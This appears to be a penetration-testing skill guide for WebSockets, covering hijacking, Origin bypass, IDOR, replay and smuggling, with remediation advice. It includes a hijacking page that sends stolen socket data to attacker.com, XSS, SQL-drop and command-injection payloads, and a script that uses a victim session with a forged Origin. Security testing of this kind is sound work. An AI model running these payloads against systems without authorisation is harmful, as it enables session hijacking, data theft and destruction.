---
name: websocket_security
description: WebSocket security testing covering cross-site WebSocket hijacking, input validation, and authentication bypass
---

# WebSocket Security

WebSockets maintain persistent bidirectional connections and are often exempt from the same security controls applied to HTTP endpoints, making them a high-value attack surface.

## Attack Surface

**Connection Weaknesses**
- Missing `Origin` header validation → Cross-Site WebSocket Hijacking (CSWSH)
- No authentication token in handshake (relies on cookies without `SameSite`)
- Upgrade endpoint accessible without session validation

**Message-Level Issues**
- Unsanitized messages processed as commands or SQL/OS calls
- JSON message injection (parameter tampering, privilege escalation)
- XSS via WebSocket message reflected into DOM
- Binary protocol manipulation

## Testing Methodology

### Step 1 – Inspect Handshake
```
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://target.com
```
Capture in Burp; note cookies and any auth tokens in the request.

### Step 2 – Cross-Site WebSocket Hijacking (CSWSH)
Create attacker page:
```html
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(e) {
  fetch("https://attacker.com/log?d=" + btoa(e.data));
};
</script>
```
If the server accepts cross-origin connections using session cookies, sensitive data is stolen.

### Step 3 – Change Origin Header in Burp
Intercept the WebSocket upgrade request and change `Origin` to `https://attacker.com`. If the server still upgrades, origin validation is absent.

### Step 4 – Message Injection / Tampering
After connecting, modify message fields:
```json
{"action": "getUser", "userId": "1"}
→ {"action": "getUser", "userId": "2"}
```
Look for IDOR, privilege escalation, or injections in message payloads.

### Step 5 – Injection via Messages
```json
{"message": "<img src=x onerror=alert(1)>"}
{"query": "'; DROP TABLE users; --"}
{"cmd": "ls /"}
```

### Step 6 – Authentication Bypass
Try connecting to `wss://target.com/ws` without cookies or with expired tokens. Check if the server allows unauthenticated message processing.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| CSWSH leaking sensitive user data | High |
| Authentication bypass on WebSocket endpoint | High |
| Command/SQL injection via messages | Critical |
| XSS via reflected WebSocket message | Medium–High |
| IDOR via message tampering | Medium |

## Remediation

- Validate `Origin` header server-side against an explicit allowlist
- Require an explicit auth token (not just session cookie) in the WebSocket handshake
- Apply the same input validation to WebSocket messages as HTTP endpoints
- Use `SameSite=Strict` cookies to prevent CSWSH
- Implement per-connection rate limiting and message size limits


## Additional Techniques — ported from WebSkills (websockets-iis-test)

### Auth Mechanisms and Their Common Mistakes

| Mechanism | Where it rides | Common mistake |
|---|---|---|
| Cookies | Auto-sent on Upgrade | Cookie-only auth + no Origin check → CSWSH; not `SameSite` |
| JWT | `Authorization`, custom header, subprotocol, or URL param | Not re-validated per message; expiry ignored on long-lived socket; JWT in URL → logged |
| Bearer/API key | Header, query string, or first frame | Key in URL (logs/referrer); never re-checked after connect; guessable |
| Session ID | Cookie or URL/message field | Predictable/sequential; reused across users; no per-action authz |
| Custom header | `X-Auth-Token` on handshake | Browsers **cannot** set custom headers on native WS handshakes — so if the app *requires* one, browser CSWSH is blocked (note it, pivot to IDOR) |

The four cardinal WS mistakes: (1) authorize only at handshake, never per message; (2) cookie auth with no Origin validation; (3) secrets in the URL; (4) trust client-supplied IDs/GUIDs in messages.

### Origin-Validation Bypass Matrix (for CSWSH)

Server-side `Origin` is the only CSWSH defense — sloppy string matching is bypassable. Replay the handshake in Repeater with each until a `101` + authed channel returns:
```
Origin: null                              (sandboxed iframe / data:/file: → null)
Origin: https://eviltarget.com            (pre-domain / startsWith prefix trick)
Origin: https://target.com.evil.com       (post-domain / endsWith trick)
Origin: https://nottarget.com             (substring contains "target.com")
Origin: https://target.com.               (trailing dot)
Origin: https://target.com:443@evil.com   (@ confusion)
Origin: (header removed entirely)
```
Win condition: any attacker-controllable Origin the handshake accepts.

### IDOR — Test Handshake ID AND Per-Message ID Separately

Apps routinely authorize one and forget the other:
- **Connection/room/subscription IDs & GUIDs** in the handshake URL/param or in messages (`{"join":"room/123"}`) — increment/guess, or **leak-then-reuse** (referrer, JS, other endpoints, error messages) beats brute for GUIDs.
- **Per-message authz gap** — handshake authorizes once, per-message resource access never re-checked → act on any object.

### graphql-ws Subscription IDOR / Unauth Check

```json
{"type":"connection_init","payload":{}}
{"type":"subscribe","id":"1","payload":{"query":"subscription { messages(conversationId:\"OTHER_USER_CONVO\"){ id body sender } }"}}
```
A `connection_ack` with **no token** = unauthenticated subscriptions; then subscribe to other users'/admin events, and try `__schema` introspection over the socket. Check both `/graphql` (WS upgrade) and `/subscriptions`.

### Message Manipulation — Replay & Race

- **Replay** — re-send a captured state-changing frame (same or new session): double-spend, re-vote, re-trigger.
- **Race cannon** — a single open socket streams dozens of identical state-changing frames with no per-request handshake overhead, tightening TOCTOU windows (balance/limit/coupon races).
- **JSON parameter pollution** — duplicate keys (`{"id":1,"id":2}`), array-vs-scalar, nested overrides → parser last-wins bypasses.

### HTTP Request Smuggling over WebSockets

Some front-end proxies stop inspecting bytes after a `101` and blindly tunnel to the backend. If the front-end *thinks* it's a WebSocket but the backend disagrees (e.g., invalid `Sec-WebSocket-Version` the proxy accepts but backend rejects), the raw tunnel lets you smuggle a second HTTP request the front-end never parsed → prefix the next user's request, bypass front-end ACLs, reach internal-only paths, or poison a shared cache. Detect via an Upgrade the front-end accepts but the backend rejects, then append a follow-up request and watch for backend processing / timing differentials.

### Automation

```python
# websocket-client — CSWSH/handshake-auth + IDOR loop
import websocket, json
ws = websocket.create_connection("wss://target.com/ws",
        header=["Origin: https://evil.com"], cookie="session=VICTIM_SESSION")
for rid in range(1, 50):
    ws.send(json.dumps({"action":"join","room":str(rid)})); print(rid, ws.recv())
```
```bash
websocat -H 'Origin: https://evil.com' "wss://target.com/ws"          # CLI connect w/ custom headers
websocat --protocol graphql-transport-ws "wss://target.com/graphql"   # graphql subscription handshake
# bash: find WS handshakes at scale
while read h; do c=$(curl -s -o /dev/null -w '%{http_code}' -H "Connection: Upgrade" \
  -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "https://$h/ws"); \
  [ "$c" = "101" ] && echo "[WS] $h/ws"; done < hosts.txt
```

### False-Positive Guards

A `101` alone is not a bug. Confirm attacker-meaningful access: private/cross-user data (not just public), cookie-only auth reproducible from a real cross-origin page (custom-header CSWSH in Repeater is not browser-reproducible), a leakable ID for GUID IDOR, and a **state-changing** replay (not an idempotent read).
